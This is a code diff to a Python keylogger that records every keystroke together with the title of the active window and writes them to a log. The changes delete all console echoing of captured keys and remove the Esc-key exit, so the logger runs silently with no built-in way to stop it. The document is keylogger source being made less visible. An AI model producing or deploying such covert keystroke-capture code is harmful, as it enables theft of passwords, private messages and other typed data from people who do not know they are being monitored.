@@ -17,8 +17,6 @@ def check_input_change(key):
     if win != gw.getActiveWindow().title or clicked or str(key) == 'Key.enter' or str(key) == 'Key.tab':
         clicked = False
         win = gw.getActiveWindow().title
-        print('\n')
-        print(f'{win} : ',sep=' ',end='',flush=True)
         logging.warning(line)
         line=f'[{win}] : '
 
@@ -27,15 +25,10 @@ def on_press(key):
     try:
         check_input_change(key)
         line+=key.char
-        print(f'{key.char}',sep=' ',end='',flush=True)
     except AttributeError:
         if str(key) == 'Key.space':
             check_input_change(key)
-            print(' ',sep=' ',end='',flush=True)
             line+=' '
-    if str(key) == 'Key.esc':
-        logging.warning(line)
-        exit()
 
 
 def on_click(x,y,pressed,button):
@@ -43,7 +36,6 @@ def on_click(x,y,pressed,button):
     clicked = True
 
 
-    
 keyLis = keyboard.Listener(on_press=on_press)
 keyLis.start()
 
